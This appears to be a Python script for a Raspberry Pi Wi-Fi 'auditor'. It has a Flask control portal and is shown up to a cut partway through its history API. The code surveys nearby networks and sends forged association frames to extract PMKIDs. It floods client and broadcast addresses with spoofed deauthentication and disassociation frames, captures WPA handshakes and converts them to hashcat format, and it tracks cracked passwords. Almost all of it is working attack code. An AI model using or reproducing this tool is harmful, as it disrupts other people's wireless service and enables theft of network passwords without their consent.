#!/usr/bin/env python3
"""
Autonomous Field Wireless Auditor
Platform: Raspberry Pi 3B+ (Kali Linux ARM64, BCM43455 Nexmon)
Author: White Hat Security Research
"""

import os
import sys
import time
import glob
import json
import re
import signal
import threading
import subprocess
import shutil
from flask import Flask, render_template, jsonify, request, send_from_directory

# Scapy imports
from scapy.all import sniff, sendp, Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth, Dot11Disas, Dot11Auth, Dot11AssoReq, RadioTap

BASE_DIR = "/home/khoa/wifi_auditor"
CAPTURES_DIR = os.path.join(BASE_DIR, "captures")
SURVEY_FILE = os.path.join(BASE_DIR, "survey.json")
HISTORY_FILE = os.path.join(BASE_DIR, "history.json")
JOB_FILE = os.path.join(BASE_DIR, "current_job.json")
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
CRACKED_FILE = os.path.join(BASE_DIR, "cracked.json")

os.makedirs(CAPTURES_DIR, exist_ok=True)
os.makedirs(TEMPLATES_DIR, exist_ok=True)

app = Flask(__name__, template_folder=TEMPLATES_DIR)

# Global State
SYSTEM_STATE = {
    "mode": "PORTAL",
    "target": None,
    "current_pcap": None,
    "handshake_captured": False,
    "audit_start_time": 0,
    "current_burst": 0,
    "burst_phase": "Idle",
    "abort_requested": False
}

def set_led(mode):
    """
    mode: 'off', 'on'
    """
    try:
        if os.path.exists('/sys/class/leds/ACT/trigger'):
            os.system('echo none > /sys/class/leds/ACT/trigger 2>/dev/null')
        if mode == 'on':
            os.system('echo 1 > /sys/class/leds/ACT/brightness 2>/dev/null')
        elif mode == 'off':
            os.system('echo 0 > /sys/class/leds/ACT/brightness 2>/dev/null')
    except Exception:
        pass

def led_worker():
    while True:
        mode = SYSTEM_STATE.get("mode")
        if mode == "AUDITING":
            if SYSTEM_STATE.get("handshake_captured"):
                # Fast blink (5Hz) -> HANDSHAKE CAPTURED!
                set_led('on')
                time.sleep(0.1)
                set_led('off')
                time.sleep(0.1)
            else:
                # Slow blink (1Hz) -> SNIFFING
                set_led('on')
                time.sleep(0.5)
                set_led('off')
                time.sleep(0.5)
        else:
            # Steady on for portal mode
            set_led('on')
            time.sleep(1)

# Start LED monitoring thread
led_thread = threading.Thread(target=led_worker, daemon=True)
led_thread.start()

def get_phy():
    out = subprocess.check_output('iw dev', shell=True).decode()
    for line in out.splitlines():
        if 'phy#' in line:
            return 'phy' + line.strip().split('#')[1]
    return 'phy0'

def get_cracked_db():
    if os.path.exists(CRACKED_FILE):
        try:
            with open(CRACKED_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def parse_telemetry(pcap_path):
    fname = os.path.basename(pcap_path)
    base_name = os.path.splitext(fname)[0]
    cache_path = os.path.join(CAPTURES_DIR, f"{base_name}.telemetry.json")
    mtime = os.path.getmtime(pcap_path)
    time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(mtime))
    
    # 1. Check if cached
    if os.path.exists(cache_path) and os.path.getmtime(cache_path) >= mtime:
        try:
            with open(cache_path, 'r', encoding='utf-8') as f:
                cached = json.load(f)
                # Ensure cracked status is updated from database
                cracked_db = get_cracked_db()
                b = cached.get("bssid", "").lower()
                s = cached.get("ssid", "")
                if b in cracked_db:
                    cached["cracked"] = True
                    cached["password"] = cracked_db[b].get("password")
                elif b.replace(':', '') in cracked_db:
                    cached["cracked"] = True
                    cached["password"] = cracked_db[b.replace(':', '')].get("password")
                elif s in cracked_db:
                    cached["cracked"] = True
                    cached["password"] = cracked_db[s].get("password")
                return cached
        except Exception:
            pass

    size_bytes = os.path.getsize(pcap_path)
    size_str = f"{size_bytes / (1024*1024):.1f} MB" if size_bytes > 1024*1024 else f"{size_bytes / 1024:.1f} KB"
    
    ssid_guess = "Unknown"
    channel_guess = 1
    m_fn = re.match(r'^\d{8}_\d{6}_(.*?)_ch(\d+)\.pcap$', fname)
    if m_fn:
        ssid_guess = m_fn.group(1).replace('_', ' ').strip()
        try: channel_guess = int(m_fn.group(2))
        except: pass

    # 2. Fast extraction via hcxpcapngtool
    tmp_22000 = f"/tmp/{base_name}.22000"
    h22000_path = os.path.join(CAPTURES_DIR, f"{base_name}.22000")
    if os.path.exists(tmp_22000):
        try: os.remove(tmp_22000)
        except: pass
        
    hcx_proc = subprocess.run(['hcxpcapngtool', '-o', tmp_22000, pcap_path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    hcx_out = hcx_proc.stdout or ""
    
    has_22000 = False
    hash_string = None
    if os.path.exists(tmp_22000) and os.path.getsize(tmp_22000) > 0:
        try:
            shutil.copyfile(tmp_22000, h22000_path)
            try: os.remove(tmp_22000)
            except: pass
            has_22000 = True
        except:
            pass
    if not has_22000 and os.path.exists(h22000_path) and os.path.getsize(h22000_path) > 0:
        has_22000 = True
        
    if has_22000:
        try:
            with open(h22000_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip()]
                if lines:
                    hash_string = lines[0]
                    parts = hash_string.split('*')
                    if len(parts) >= 6:
                        ssid_hex = parts[5]
                        try:
                            decoded_ssid = bytes.fromhex(ssid_hex).decode('utf-8', errors='ignore')
                            if decoded_ssid: ssid_guess = decoded_ssid
                        except: pass
        except:
            pass

    duration = "N/A"
    packets = 0
    eapol_total = 0
    m1_count = 0
    m2_count = 0
    m3_count = 0
    m4_count = 0
    eapol_pairs = 0
    pmkid_count = 0
    deauths = 0
    disassocs = 0
    rc_checked = False

    for line in hcx_out.splitlines():
        if 'duration (rounded)' in line:
            m = re.search(r':\s*(.*)', line)
            if m: duration = m.group(1).strip()
        elif 'packets inside' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: packets = int(m.group(1))
        elif 'EAPOL messages (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: eapol_total = int(m.group(1))
        elif 'EAPOL M1 messages (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: m1_count = int(m.group(1))
        elif 'EAPOL M2 messages (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: m2_count = int(m.group(1))
        elif 'EAPOL M3 messages (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: m3_count = int(m.group(1))
        elif 'EAPOL M4 messages (total)' in line and 'zeroed' not in line:
            m = re.search(r':\s*(\d+)', line)
            if m: m4_count = int(m.group(1))
        elif 'EAPOL pairs (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: eapol_pairs = int(m.group(1))
        elif 'RSN PMKID (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: pmkid_count = int(m.group(1))
        elif 'DEAUTHENTICATION (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: deauths = int(m.group(1))
        elif 'DISASSOCIATION (total)' in line:
            m = re.search(r':\s*(\d+)', line)
            if m: disassocs = int(m.group(1))
        elif 'RC checked' in line:
            rc_checked = True

    # 3. Parse Clients & RSSI via fast tcpdump pass
    clients_map = {}
    ap_bssid = None
    ap_signals = []
    client_signals = []

    try:
        td_proc = subprocess.run(
            ['tcpdump', '-r', pcap_path, '-c', '60', '-e', '-n', 'ether proto 0x888e'],
            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, timeout=3
        )
        for line in td_proc.stdout.splitlines():
            sig_m = re.search(r'([-\d]+)dBm signal', line)
            sig = int(sig_m.group(1)) if sig_m else None
            
            bss_m = re.search(r'BSSID:([0-9a-fA-F:]{17})', line)
            if bss_m and not ap_bssid:
                ap_bssid = bss_m.group(1).lower()
                
            sa_m = re.search(r'SA:([0-9a-fA-F:]{17})', line)
            da_m = re.search(r'DA:([0-9a-fA-F:]{17})', line)
            
            sa = sa_m.group(1).lower() if sa_m else None
            da = da_m.group(1).lower() if da_m else None
            
            if ap_bssid and sa == ap_bssid and da and not da.startswith('ff:'):
                if sig: ap_signals.append(sig)
                if da != "02:00:00:11:22:33":
                    if da not in clients_map:
                        clients_map[da] = {"mac": da, "signals": [], "role": "Station (Client)"}
            elif ap_bssid and da == ap_bssid and sa and not sa.startswith('ff:'):
                if sig: client_signals.append(sig)
                if sa != "02:00:00:11:22:33":
                    if sa not in clients_map:
                        clients_map[sa] = {"mac": sa, "signals": [], "role": "Station (Client)"}
                    if sig: clients_map[sa]["signals"].append(sig)
    except Exception:
        pass

    clients_list = []
    for mac, data in clients_map.items():
        sigs = data["signals"]
        avg_sig = int(sum(sigs)/len(sigs)) if sigs else (int(sum(client_signals)/len(client_signals)) if client_signals else -50)
        clients_list.append({
            "mac": mac,
            "signal": avg_sig,
            "packets": len(sigs) if sigs else 1,
            "role": "Station (Client)"
        })

    avg_ap_sig = int(sum(ap_signals)/len(ap_signals)) if ap_signals else -50
    avg_cl_sig = int(sum(client_signals)/len(client_signals)) if client_signals else (clients_list[0]["signal"] if clients_list else -50)

    cracked_db = get_cracked_db()
    is_cracked = False
    cracked_pwd = None
    b_key = ap_bssid.lower() if ap_bssid else ""
    if b_key in cracked_db:
        is_cracked = True
        cracked_pwd = cracked_db[b_key].get("password")
    elif b_key.replace(':', '') in cracked_db:
        is_cracked = True
        cracked_pwd = cracked_db[b_key.replace(':', '')].get("password")
    elif ssid_guess in cracked_db:
        is_cracked = True
        cracked_pwd = cracked_db[ssid_guess].get("password")

    has_handshake = has_22000 or (m1_count > 0 and m2_count > 0) or pmkid_count > 0

    result = {
        "filename": fname,
        "basename": base_name,
        "mtime": mtime,
        "time_str": time_str,
        "ssid": ssid_guess,
        "bssid": ap_bssid or "Unknown",
        "channel": channel_guess,
        "size": size_str,
        "duration": duration,
        "packets": packets,
        "deauths": deauths,
        "disassocs": disassocs,
        "has_handshake": has_handshake,
        "has_pmkid": pmkid_count > 0,
        "pmkid_count": pmkid_count,
        "eapol_count": eapol_total,
        "eapol_total": eapol_total,
        "m1_count": m1_count,
        "m2_count": m2_count,
        "m3_count": m3_count,
        "m4_count": m4_count,
        "eapol_pairs": eapol_pairs,
        "rc_checked": rc_checked,
        "has_22000": has_22000,
        "hashcat_file": f"{base_name}.22000" if has_22000 else None,
        "hash_string": hash_string,
        "clients": clients_list,
        "clients_count": len(clients_list),
        "client_macs": [c["mac"] for c in clients_list],
        "ap_signal": avg_ap_sig,
        "client_signal": avg_cl_sig,
        "signal_delta": abs(avg_ap_sig - avg_cl_sig),
        "status": "VALID_HANDSHAKE" if has_handshake else "PASSIVE_ONLY",
        "cracked": is_cracked,
        "password": cracked_pwd
    }

    try:
        with open(cache_path, 'w', encoding='utf-8') as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

    return result

def verify_all_pcaps():
    results = []
    pcap_files = sorted(glob.glob(os.path.join(CAPTURES_DIR, "*.pcap")), key=os.path.getmtime, reverse=True)
    
    for pcap in pcap_files:
        try:
            t = parse_telemetry(pcap)
            results.append(t)
        except Exception as e:
            print(f"[!] Error parsing {pcap}: {e}")
            
    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    return results

def freq_to_channel(freq):
    try:
        f = int(float(freq))
        if f == 2484: return 14
        if 2412 <= f <= 2472: return (f - 2407) // 5
        if 5180 <= f <= 5825: return (f - 5000) // 5
    except Exception:
        pass
    return 1

def reload_wifi_driver():
    """Reloads brcmfmac to ensure pristine chip state in Nexmon firmware without driver leaks."""
    os.system('killall -9 hostapd dnsmasq tcpdump 2>/dev/null || true')
    os.system('modprobe -r brcmfmac_wcc 2>/dev/null || true')
    os.system('modprobe -r brcmfmac 2>/dev/null || true')
    time.sleep(0.5)
    os.system('modprobe brcmfmac')
    time.sleep(1.2)

def run_wifi_survey(sweep_seconds=12):
    SYSTEM_STATE["mode"] = "SURVEYING"
    print("[*] Initiating Wi-Fi environment survey via firmware active scan...")
    
    reload_wifi_driver()
    os.system('rfkill unblock all 2>/dev/null || true')
    os.system('ip link set wlan0 down 2>/dev/null || true')
    os.system('iw dev wlan0 set type managed 2>/dev/null || true')
    os.system('ip link set wlan0 up 2>/dev/null || true')
    # Unblock full spectrum (2.4 GHz + 5 GHz UNII-1/2/3)
    os.system('iw reg set US 2>/dev/null || true')
    os.system('iw dev wlan0 set txpower fixed 3000 2>/dev/null || true')
    time.sleep(1)
    
    # Load existing survey cache (retaining APs seen within the last 30 minutes)
    existing_cache = {}
    now = time.time()
    if os.path.exists(SURVEY_FILE):
        try:
            with open(SURVEY_FILE, 'r', encoding='utf-8') as f:
                cached_list = json.load(f)
                for item in cached_list:
                    b = item.get("bssid", "").lower()
                    last_seen = item.get("last_seen", now)
                    if b and (now - last_seen < 1800):
                        existing_cache[b] = item
        except Exception as e:
            print(f"[!] Warning reading survey cache: {e}")

    networks = {}
    try:
        # Step A: Query kernel cached BSS dump to preserve passive/beaconed APs
        cached_dump = ""
        try:
            cached_dump = subprocess.check_output(['iw', 'dev', 'wlan0', 'scan', 'dump'], stderr=subprocess.DEVNULL, timeout=5).decode('utf-8', errors='ignore')
        except Exception:
            pass

        # Step B: Trigger comprehensive active sweep pass 1
        fresh_scan_1 = ""
        try:
            fresh_scan_1 = subprocess.check_output(['iw', 'dev', 'wlan0', 'scan'], stderr=subprocess.DEVNULL, timeout=16).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"[!] Active scan sweep 1 notice: {e}")

        # Step C: Trigger active sweep pass 2 (catches sleeping APs / personal hotspots)
        fresh_scan_2 = ""
        try:
            time.sleep(0.5)
            fresh_scan_2 = subprocess.check_output(['iw', 'dev', 'wlan0', 'scan'], stderr=subprocess.DEVNULL, timeout=16).decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"[!] Active scan sweep 2 notice: {e}")

        scan_out = (cached_dump + "\n" + fresh_scan_1 + "\n" + fresh_scan_2).strip()
        
        # Regex split matching start of line BSS followed by MAC
        bss_pattern = re.compile(r"^BSS ([0-9a-fA-F:]{17})", re.MULTILINE)
        matches = list(bss_pattern.finditer(scan_out))
        for i, m in enumerate(matches):
            bssid = m.group(1).lower()
            start_pos = m.start()
            end_pos = matches[i+1].start() if i+1 < len(matches) else len(scan_out)
            block = scan_out[start_pos:end_pos]
            lines = [l.strip() for l in block.splitlines()]
            
            ssid = '<Hidden>'
            channel = 1
            freq = 2412
            rssi = -100
            crypto = 'Open'
            
            for l in lines:
                if l.startswith('SSID:'):
                    val = l[5:].strip()
                    try:
                        val_decoded = bytes(val, 'utf-8').decode('unicode_escape').encode('latin1').decode('utf-8')
                        if val_decoded: ssid = val_decoded
                    except Exception:
                        if val: ssid = val
                elif l.startswith('freq:'):
                    f_str = l[5:].strip()
                    try: freq = int(float(f_str))
                    except Exception: pass
                    channel = freq_to_channel(f_str)
                elif l.startswith('signal:'):
                    sig_m = re.search(r'([-+]?[0-9]*\.?[0-9]+)', l)
                    if sig_m:
                        try: rssi = int(float(sig_m.group(1)))
                        except Exception: pass
                elif 'SAE' in l or 'WPA3' in l:
                    crypto = 'WPA3/WPA2'
                elif 'RSN:' in l or 'WPA2' in l:
                    if crypto != 'WPA3/WPA2': crypto = 'WPA2'
                elif 'WPA:' in l:
                    if crypto not in ['WPA2', 'WPA3/WPA2']: crypto = 'WPA'
            
            if 1 <= channel <= 165:
                band = "5 GHz" if channel > 14 else "2.4 GHz"
                existing = networks.get(bssid)
                if not existing or rssi > existing['rssi']:
                    networks[bssid] = {
                        "ssid": ssid,
                        "bssid": bssid,
                        "channel": channel,
                        "freq": freq,
                        "band": band,
                        "rssi": rssi,
                        "crypto": crypto,
                        "last_seen": now
                    }
    except Exception as e:
        print(f"[!] Scan error: {e}")

    # Merge fresh scan into cumulative aging cache
    now = time.time()
    for bssid, net in networks.items():
        if bssid in existing_cache:
            prev = existing_cache[bssid]
            # If current scan did not capture SSID (transient hidden), preserve cached SSID
            if net["ssid"] == "<Hidden>" and prev.get("ssid") and prev.get("ssid") != "<Hidden>":
                net["ssid"] = prev["ssid"]
            net["first_seen"] = prev.get("first_seen", now)
        else:
            net["first_seen"] = now
        net["last_seen"] = now
        existing_cache[bssid] = net

    results = sorted(list(existing_cache.values()), key=lambda x: x.get('rssi', -100), reverse=True)
    if len(results) > 0:
        with open(SURVEY_FILE, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        print(f"[+] Survey complete: {len(results)} networks tracked in cumulative cache ({len(networks)} fresh).")
    else:
        print("[!] Firmware survey returned 0 networks. Retaining existing survey cache.")
        if os.path.exists(SURVEY_FILE):
            try:
                with open(SURVEY_FILE, 'r', encoding='utf-8') as f:
                    results = json.load(f)
            except Exception:
                pass
    return results

def start_management_portal():
    SYSTEM_STATE["mode"] = "PORTAL"
    SYSTEM_STATE["target"] = None
    SYSTEM_STATE["current_pcap"] = None
    SYSTEM_STATE["abort_requested"] = False
    print("[*] Launching Management Portal on wlan0 (Pi-Auditor AP: 192.168.4.1)...")
    
    reload_wifi_driver()
    os.system('rfkill unblock all 2>/dev/null || true')
    os.system('ip link set wlan0 down 2>/dev/null || true')
    os.system('iw dev wlan0 set type __ap 2>/dev/null || true')
    os.system('ip link set wlan0 up 2>/dev/null || true')
    
    os.system('ip addr flush dev wlan0 2>/dev/null || true')
    os.system('ip addr add 192.168.4.1/24 dev wlan0 2>/dev/null || true')
    
    os.system('iw reg set US 2>/dev/null || true')
    os.system('iw dev wlan0 set txpower fixed 3000 2>/dev/null || true')
    
    hostapd_conf = """interface=wlan0
ssid=Pi-Auditor
hw_mode=g
channel=7
auth_algs=1
wmm_enabled=0
"""
    with open('/tmp/auditor_hostapd.conf', 'w') as f:
        f.write(hostapd_conf)
        
    dnsmasq_conf = """interface=wlan0
dhcp-range=192.168.4.10,192.168.4.50,255.255.255.0,12h
address=/#/192.168.4.1
"""
    with open('/tmp/auditor_dnsmasq.conf', 'w') as f:
        f.write(dnsmasq_conf)
        
    subprocess.Popen(['hostapd', '-B', '/tmp/auditor_hostapd.conf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.5)
    subprocess.Popen(['dnsmasq', '-C', '/tmp/auditor_dnsmasq.conf'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Management Portal is LIVE! Connect to 'Pi-Auditor' (Open) -> http://192.168.4.1:5000")

def get_associated_clients(ap_mac):
    clients = set()
    try:
        out = subprocess.check_output(['iw', 'dev', 'wlan0', 'station', 'dump'], stderr=subprocess.DEVNULL).decode()
        for line in out.splitlines():
            if line.startswith('Station'):
                mac = line.split()[1].strip().lower()
                clients.add(mac)
    except Exception:
        pass
    try:
        if os.path.exists('/var/lib/misc/dnsmasq.leases'):
            with open('/var/lib/misc/dnsmasq.leases') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 2:
                        clients.add(parts[1].lower())
    except Exception:
        pass
    return list(clients)

def audit_worker(ssid, bssid, channel, bursts):
    SYSTEM_STATE["mode"] = "AUDITING"
    SYSTEM_STATE["target"] = {"ssid": ssid, "bssid": bssid, "channel": channel, "bursts": bursts}
    SYSTEM_STATE["handshake_captured"] = False
    SYSTEM_STATE["abort_requested"] = False
    SYSTEM_STATE["audit_start_time"] = time.time()
    SYSTEM_STATE["current_burst"] = 0
    SYSTEM_STATE["burst_phase"] = "Initializing"
    
    print(f"\n{'='*60}\n[*] Starting Audit Job: {ssid} ({bssid}) on Channel {channel}\n{'='*60}")
    
    clean_ssid = re.sub(r'[^a-zA-Z0-9_-]', '_', ssid) or "target"
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    pcap_path = os.path.join(CAPTURES_DIR, f"{timestamp}_{clean_ssid}_ch{channel}.pcap")
    SYSTEM_STATE["current_pcap"] = pcap_path
    
    job_info = {
        "ssid": ssid,
        "bssid": bssid,
        "channel": channel,
        "pcap": pcap_path,
        "start_time": time.time(),
        "handshake_captured": False
    }
    with open(JOB_FILE, 'w') as f:
        json.dump(job_info, f, indent=2)
    os.sync()
    
    print("[*] Transitioning radio from Management AP to Monitor Mode...")
    SYSTEM_STATE["burst_phase"] = "Switching to Monitor Mode"
    reload_wifi_driver()

    os.system('rfkill unblock all 2>/dev/null || true')
    os.system('iw phy phy0 interface add wlan0mon type monitor 2>/dev/null || true')
    os.system('ip link set wlan0 up 2>/dev/null || true')
    os.system('ip link set wlan0mon up 2>/dev/null || true')
    os.system(f'iw dev wlan0mon set channel {channel} 2>/dev/null || true')
    os.system(f'iw dev wlan0 set channel {channel} 2>/dev/null || true')
    os.system('iw reg set US 2>/dev/null || true')
    os.system('iw dev wlan0mon set txpower fixed 3000 2>/dev/null || true')
    time.sleep(0.5)
    
    print(f"[+] Starting unbuffered capture -> {pcap_path}")
    SYSTEM_STATE["burst_phase"] = "Sniffing Traffic"
    tcpdump_proc = subprocess.Popen(
        ['tcpdump', '-i', 'wlan0mon', '-s', '0', '-U', '-w', pcap_path],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    os.sync()
    time.sleep(0.5)
    
    # Clientless PMKID Association Probe
    if not SYSTEM_STATE.get("abort_requested"):
        print(f"[*] Dispatching PMKID association probe to {bssid}...")
        SYSTEM_STATE["burst_phase"] = "PMKID Probe"
        try:
            audit_mac = "02:00:00:11:22:33"
            auth_pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=audit_mac, addr3=bssid)/Dot11Auth(algo=0, seqnum=1, status=0)
            sendp(auth_pkt, iface='wlan0mon', count=2, inter=0.05, verbose=0)
            time.sleep(0.1)
            
            rates = b"\x82\x84\x8b\x96\x0c\x12\x18\x24"
            rsn_ie = b"\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x00\x00"
            assoc_pkt = (RadioTap()/
                         Dot11(type=0, subtype=0, addr1=bssid, addr2=audit_mac, addr3=bssid)/
                         Dot11AssoReq(cap=0x1104, listen_interval=1)/
                         Dot11Elt(ID=0, info=ssid.encode('utf-8', errors='ignore'))/
                         Dot11Elt(ID=1, info=rates)/
                         Dot11Elt(ID=48, info=rsn_ie))
            sendp(assoc_pkt, iface='wlan0mon', count=2, inter=0.05, verbose=0)
            print("[+] PMKID probe frames dispatched. Listening for EAPOL M1...")
        except Exception as e:
            print(f"[!] PMKID probe error: {e}")
        time.sleep(1.0)
    
    # Paced Deauth / Continuous Stress Routine
    is_continuous = (bursts == -1)
    if (bursts > 0 or is_continuous) and not SYSTEM_STATE.get("abort_requested"):
        burst_num = 1
        active_clients = set()
        
        # Quick active client probe pass (3s sniff)
        def client_collector(pkt):
            if pkt.haslayer(Dot11):
                a1 = pkt[Dot11].addr1
                a2 = pkt[Dot11].addr2
                if a1 and a1.lower() == bssid.lower() and a2 and not a2.startswith('ff:'):
                    active_clients.add(a2.lower())
                elif a2 and a2.lower() == bssid.lower() and a1 and not a1.startswith('ff:'):
                    active_clients.add(a1.lower())

        try:
            sniff(iface='wlan0mon', prn=client_collector, timeout=3, store=0, promisc=False)
        except Exception:
            pass

        while not SYSTEM_STATE.get("abort_requested"):
            if not is_continuous and burst_num > bursts:
                break
            if not is_continuous and SYSTEM_STATE.get("handshake_captured"):
                break
                
            SYSTEM_STATE["current_burst"] = burst_num
            if is_continuous:
                SYSTEM_STATE["burst_phase"] = f"Continuous Stream: Burst #{burst_num} Active ({len(active_clients)} clients)"
            else:
                SYSTEM_STATE["burst_phase"] = f"Burst {burst_num}/{bursts} (Transmitting)"
                
            burst_frames = []
            if active_clients:
                for client_mac in list(active_clients)[:4]:
                    burst_frames.append(RadioTap()/Dot11(type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=2))
                    burst_frames.append(RadioTap()/Dot11(type=0, subtype=12, addr1=client_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7))
                    burst_frames.append(RadioTap()/Dot11(type=0, subtype=10, addr1=client_mac, addr2=bssid, addr3=bssid)/Dot11Disas(reason=8))
                    burst_frames.append(RadioTap()/Dot11(type=0, subtype=10, addr1=client_mac, addr2=bssid, addr3=bssid)/Dot11Disas(reason=4))
                    burst_frames.append(RadioTap()/Dot11(type=0, subtype=12, addr1=bssid, addr2=client_mac, addr3=bssid)/Dot11Deauth(reason=8))
                    burst_frames.append(RadioTap()/Dot11(type=0, subtype=10, addr1=bssid, addr2=client_mac, addr3=bssid)/Dot11Disas(reason=3))
            
            # Broadcast Fallback
            burst_frames.append(RadioTap()/Dot11(type=0, subtype=12, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/Dot11Deauth(reason=6))
            burst_frames.append(RadioTap()/Dot11(type=0, subtype=10, addr1='ff:ff:ff:ff:ff:ff', addr2=bssid, addr3=bssid)/Dot11Disas(reason=7))
            
            composite_set = burst_frames * 2
            try:
                sendp(composite_set, iface='wlan0mon', inter=0.01, verbose=0)
            except Exception as e:
                print(f"[!] Transmit error: {e}")
            os.sync()
            
            # Pacing interval: 0.5s if continuous, 6.0s if standard audit
            wait_time = 0.5 if is_continuous else 6.0
            t_end = time.time() + wait_time
            while time.time() < t_end:
                if SYSTEM_STATE.get("abort_requested"):
                    break
                time.sleep(0.1)
                
            burst_num += 1
            
            # Safety timeout (180s)
            if is_continuous and (time.time() - SYSTEM_STATE["audit_start_time"] > 180):
                print("[*] Continuous safety timeout (180s) reached. Stopping transmission.")
                break

    if is_continuous:
        print("[*] Continuous transmission ended. Returning to portal...")
        SYSTEM_STATE["burst_phase"] = "Restoring Portal"
    else:
        print("[+] Deauth bursts completed. Transitioning to passive capture mode.")
    SYSTEM_STATE["burst_phase"] = "Passive Capture & Verification"
    
    last_check_t = time.time()
    capture_start = time.time()
    
    while True:
        if SYSTEM_STATE.get("abort_requested"):
            print("[*] Audit aborted by operator. Returning to portal...")
            break
            
        time.sleep(2)
        os.sync()
        
        # Periodic handshake verification every 4 seconds
        if time.time() - last_check_t > 4:
            last_check_t = time.time()
            try:
                tmp_test = f"/tmp/check_{int(time.time())}.22000"
                subprocess.run(['hcxpcapngtool', '-o', tmp_test, pcap_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if os.path.exists(tmp_test) and os.path.getsize(tmp_test) > 0:
                    try: os.remove(tmp_test)
                    except: pass
                    if not SYSTEM_STATE["handshake_captured"]:
                        print("[🎯] VALID WPA HANDSHAKE / PMKID CAPTURED! Blinking ACT LED rapidly!")
                        SYSTEM_STATE["handshake_captured"] = True
                        SYSTEM_STATE["burst_phase"] = "Handshake Secured!"
                        job_info["handshake_captured"] = True
                        with open(JOB_FILE, 'w') as f:
                            json.dump(job_info, f, indent=2)
                        os.sync()
                        
                        # Once captured, capture 5 more seconds to grab any trailing frames, then restore portal!
                        time.sleep(5)
                        break
            except Exception as e:
                print(f"[!] Capture check notice: {e}")
                
        # Safety auto-return timeout: if 75s have elapsed without handshake, restore portal
        if time.time() - capture_start > 75:
            print("[*] Capture window completed (75s). Restoring Management Portal...")
            break

    try:
        tcpdump_proc.terminate()
        tcpdump_proc.wait(timeout=2)
    except:
        try: tcpdump_proc.kill()
        except: pass
    os.sync()
    
    verify_all_pcaps()
    start_management_portal()

# Web API Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/survey/clear', methods=['POST'])
def api_survey_clear():
    if os.path.exists(SURVEY_FILE):
        try:
            os.remove(SURVEY_FILE)
        except Exception:
            pass
    return jsonify({"status": "ok", "message": "Survey cache cleared."})

@app.route('/api/survey')
def api_survey():
    if SYSTEM_STATE.get("mode") == "SURVEYING":
        return jsonify({"status": "scanning", "message": "Survey in progress..."}), 202
    if os.path.exists(SURVEY_FILE):
        with open(SURVEY_FILE, 'r', encoding='utf-8') as f:
            return jsonify(json.load(f))
    return jsonify([])

@app.route('/api/status')
def api_status():
    target = SYSTEM_STATE.get("target") or {}
    start_time = SYSTEM_STATE.get("audit_start_time", 0)
    elapsed = int(time.time() - start_time) if start_time and SYSTEM_STATE.get("mode") == "AUDITING" else 0
    pcap_path = SYSTEM_STATE.get("current_pcap")
    pcap_size_kb = 0
    pkt_count = 0
    if pcap_path and os.path.exists(pcap_path):
        try:
            pcap_size = os.path.getsize(pcap_path)
            pcap_size_kb = pcap_size // 1024
            pkt_count = pcap_size // 140
        except:
            pass

    return jsonify({
        "mode": SYSTEM_STATE.get("mode", "PORTAL"),
        "target": target,
        "elapsed": elapsed,
        "timeout": 75,
        "bursts_total": target.get("bursts", 3),
        "burst_current": SYSTEM_STATE.get("current_burst", 0),
        "burst_phase": SYSTEM_STATE.get("burst_phase", "Idle"),
        "packets": pkt_count,
        "pcap_size_kb": pcap_size_kb,
        "handshake_captured": SYSTEM_STATE.get("handshake_captured", False),
        "pcap_file": os.path.basename(pcap_path) if pcap_path else None
    })

@app.route('/api/abort', methods=['POST'])
def api_abort():
    SYSTEM_STATE["abort_requested"] = True
    return jsonify({"status": "ok", "message": "Abort signal sent. Restoring portal..."})

@app.route('/api/history')
def api_history():
    refresh = request.args.get('refresh', '0') == '1'
    items = []
    if refresh or not os.path.exists(HISTORY_FILE):
        items = verify_all_pcaps()
    else:
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                items = json.load(f)
        except Exception:
            items = verify_all_pcaps()

    # Prepend active recording job if currently auditing
    if SYSTEM_STATE.get("mode") == "AUDITING" and SYSTEM_STATE.get("current_pcap"):
        cur_pcap = SYSTEM_STATE.get("current_pcap")
        tgt = SYSTEM_STATE.get("target") or {}
        start_t = SYSTEM_STATE.get("audit_start_time", time.time())
        dur_s = int(time.time() - start_t)
        sz_kb = os.path.getsize(cur_pcap) // 1024 if os.path.exists(cur_pcap) else 0

        active_entry = {
            "filename": os.path.basename(cur_pcap),
            "basename": os.path.splitext(os.path.basename(cur_pcap))[0],
            "ssid": tgt.get("ssid", "Active Target"),
            "bssid": tgt.get("bssid", "Target BSSID"),
